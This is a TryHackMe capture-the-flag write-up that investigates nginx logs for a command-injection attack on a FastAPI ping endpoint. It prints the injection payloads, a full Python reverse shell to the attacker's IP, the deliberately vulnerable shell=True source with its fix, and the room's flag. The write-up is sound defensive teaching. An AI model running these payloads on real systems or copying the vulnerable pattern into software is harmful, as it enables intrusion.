# TryHackMe – Linux Threat Detection: Analyzing Malicious Services

**Category:** Threat Detection / Web Application Security  
**Difficulty:** Easy  
**Platform:** TryHackMe  
**Room:** Linux Threat Detection 1 v5  
**Flag:** `THM{i_am_vulnerable!}`

---

## Overview

This room simulated a real-world Linux threat detection scenario involving a vulnerable FastAPI web application. The goal was to investigate nginx access logs, identify an active attack pattern, trace the attacker's activity step by step, and locate the vulnerability in the application source code.

The attack chain uncovered was a **Command Injection** exploitation against an unsanitized `/ping` endpoint — ultimately exposing the application source and a Python reverse shell payload.

---

## Environment

| Detail | Value |
|--------|-------|
| Target OS | Linux (Ubuntu) |
| Web Server | nginx |
| Application | FastAPI (`/opt/trypingme/main.py`) |
| Log file analyzed | `/var/log/nginx/access.log` |
| Attacker IP | `10.14.105.255` |

---

## Step 1 – Nginx Log Analysis

The investigation began by reading the nginx access log to identify suspicious activity:

```bash
$ cat /var/log/nginx/access.log
```

The log revealed multiple GET requests to the `/ping` endpoint from different source IPs. Two stood out immediately:

![nginx access log showing the full attack progression from 10.14.105.255](images/access_log.png)

**Legitimate-looking requests:**
```
10.2.33.10  - [19/Aug/2025:12:26:07] "GET /ping?host=3.109.33.76 HTTP/1.1" 200 312
10.12.88.67 - [23/Aug/2025:09:32:22] "GET /ping?host=54.36.19.83 HTTP/1.1" 200 287
```

**Suspicious requests from `10.14.105.255` (26/Aug/2025):**
```
GET /ping?host=hello          → 500 (error — non-IP input)
GET /ping?host=whoami         → 500 (error — still probing)
GET /ping?host=;whoami        → 200 81  (command injection confirmed!)
GET /ping?host=;ls            → 200 78
GET /ping?host=;pwd           → 200 85
GET /ping?host=;cat+/opt/trypingme/main.py  → 200 330
GET /ping?host=;python3%20-c%20'import%20socket...' → 504 (reverse shell attempt)
```

> **Key observation:** The attacker escalated from input validation testing (`hello`, `whoami`) to confirmed injection (`;whoami` → HTTP 200) to source code exfiltration and a reverse shell attempt — all within 3 minutes.

---

## Step 2 – Decoding the Attack Progression

The attacker followed a classic **Command Injection** exploitation pattern:

### 2a. Probing the endpoint
```
/ping?host=hello   → 500  (application crashed — unexpected input)
/ping?host=whoami  → 500  (still failing — not injecting yet)
```

### 2b. Bypassing with semicolon injection
```
/ping?host=;whoami → 200  (SUCCESS — semicolon terminates ping, runs whoami)
```

The semicolon (`;`) terminates the intended `ping` command and appends a new arbitrary command. The underlying vulnerable code runs:
```bash
ping -c 2 ;whoami   # whoami executes as a separate command
```

### 2c. Enumeration via injection
```
/ping?host=;ls      → listed directory contents
/ping?host=;pwd     → confirmed working directory
```

### 2d. Source code exfiltration
```
/ping?host=;cat+/opt/trypingme/main.py  → dumped full application source
```

### 2e. Reverse shell attempt (URL-decoded)
```python
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.14.105.255",1337));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
import pty; pty.spawn("sh")'
```

This is a standard Python reverse shell connecting back to the attacker's machine on port `1337`. It returned HTTP `504` (Gateway Timeout) — the outbound connection was likely blocked, preventing full compromise.

---

## Step 3 – Inspecting the Vulnerable Application

The source code was read directly from disk:

```bash
$ cat /opt/trypingme/main.py
```

![main.py source code showing the vulnerable ping function and the flag](images/main_py.png)

```python
"""
Welcome to TryPingMe app (version 0.0.1)!
This is just a draft, sorry for the bad code

Dev Team
"""

import subprocess
import uvicorn
from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()

@app.get("/ping", response_class=HTMLResponse)
def ping(host: str):
    # TODO: Add security checks
    # THM{i_am_vulnerable!}
    cmd = f"ping -c 2 {host}"
    result = subprocess.check_output(cmd, shell=True)
    response = f"<h3>Checking the host: {host}</h3>\n"
    response += f"<pre>{result.decode()}</pre>"
    return response

if __name__ == "__main__":
    uvicorn.run(app)
```

### Vulnerability Analysis

The critical flaw is on this line:

```python
cmd = f"ping -c 2 {host}"
result = subprocess.check_output(cmd, shell=True)
```

**Two compounding mistakes:**
1. **No input sanitization** — the `host` parameter is inserted directly into the shell command with zero validation
2. **`shell=True`** — this tells Python to pass the entire string to `/bin/sh`, which interprets shell metacharacters like `;`, `|`, `&&`, and backticks

**Impact:** Any attacker who can reach the `/ping` endpoint can execute arbitrary OS commands as whatever user runs the application.

**Fix (recommended):**
```python
import shlex, ipaddress

def ping(host: str):
    try:
        ipaddress.ip_address(host)  # validate it's a real IP
    except ValueError:
        return HTMLResponse("Invalid host", status_code=400)
    
    cmd = ["ping", "-c", "2", host]  # list form — no shell interpretation
    result = subprocess.check_output(cmd, shell=False)  # shell=False
    ...
```

---

## Step 4 – Flag

The flag was embedded in the source code as a comment, left by the developer as an acknowledgment of the vulnerability:

```
THM{i_am_vulnerable!}
```

---

## Attack Timeline

| Time (UTC) | Source IP | Request | Status | Action |
|------------|-----------|---------|--------|--------|
| 19/Aug 12:26 | 10.2.33.10 | `GET /ping?host=3.109.33.76` | 200 | Legitimate use |
| 23/Aug 09:32 | 10.12.88.67 | `GET /ping?host=54.36.19.83` | 200 | Legitimate use |
| 26/Aug 20:09 | 10.14.105.255 | `GET /ping?host=hello` | 500 | Probe begins |
| 26/Aug 20:09 | 10.14.105.255 | `GET /ping?host=whoami` | 500 | Probe continues |
| 26/Aug 20:09 | 10.14.105.255 | `GET /ping?host=;whoami` | 200 | **Injection confirmed** |
| 26/Aug 20:10 | 10.14.105.255 | `GET /ping?host=;ls` | 200 | Directory enumeration |
| 26/Aug 20:10 | 10.14.105.255 | `GET /ping?host=;pwd` | 200 | Path enumeration |
| 26/Aug 20:10 | 10.14.105.255 | `GET /ping?host=;cat+/opt/trypingme/main.py` | 200 | **Source exfiltrated** |
| 26/Aug 20:12 | 10.14.105.255 | `GET /ping?host=;python3 -c '...'` | 504 | Reverse shell attempt (blocked) |

---

## Key Concepts

- **Command Injection (CWE-78)** — Unsanitized user input passed to a shell command allows arbitrary OS command execution. Maps to **MITRE ATT&CK T1059 – Command and Scripting Interpreter**.
- **`shell=True` danger** — Python's `subprocess` with `shell=True` passes the full string to `/bin/sh`, enabling metacharacter abuse. Always use list arguments with `shell=False`.
- **Log-based threat detection** — nginx access logs expose attack progression through HTTP status codes and URL patterns. Status code changes (500 → 200 on injection payloads) are a strong signal.
- **Reverse shell patterns** — Python socket-based reverse shells are common post-exploitation tools. Outbound connections to non-standard ports (e.g., 1337) in logs indicate exfiltration or shell attempts.
- **Source code exposure** — Once injection is confirmed, reading application source (`cat main.py`) is a standard attacker move to find credentials, logic flaws, and further pivot points.

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|----|-------------|
| Command and Scripting Interpreter | T1059 | Attacker used shell injection via web parameter |
| Exploit Public-Facing Application | T1190 | Vulnerable `/ping` endpoint exposed to network |
| Ingress Tool Transfer / Exfiltration | T1105 | Source code read via injection |
| Reverse Shell / C2 | T1071.001 | Python reverse shell over TCP port 1337 |

---

## Tools & Commands Used

| Tool / Command | Purpose |
|----------------|---------|
| `cat /var/log/nginx/access.log` | Read web server logs to identify attacker activity |
| `cat /opt/trypingme/main.py` | Inspect vulnerable application source code |
| URL decoding (manual) | Decode percent-encoded payloads in log entries |

---

## Screenshots

Screenshots are embedded inline throughout the write-up above at their relevant steps.

| Screenshot | Section |
|------------|---------|
| `<img width="959" height="978" alt="Screenshot 2026-05-10 001707" src="https://github.com/user-attachments/assets/3d8a4ffe-d962-4ac1-9ece-7b0e0b45e538" />
` | Step 1 – Nginx Log Analysis |
| `<img width="959" height="850" alt="Screenshot 2026-05-10 001725" src="https://github.com/user-attachments/assets/337c5743-ba0b-4805-9fa3-30e15d1448d6" />
| Step 3 – Vulnerable Application Source |

---

*Write-up by Mohammed Suhail | [GitHub](https://github.com/suhail-00/Tryhackme) | [LinkedIn](https://www.linkedin.com/)*
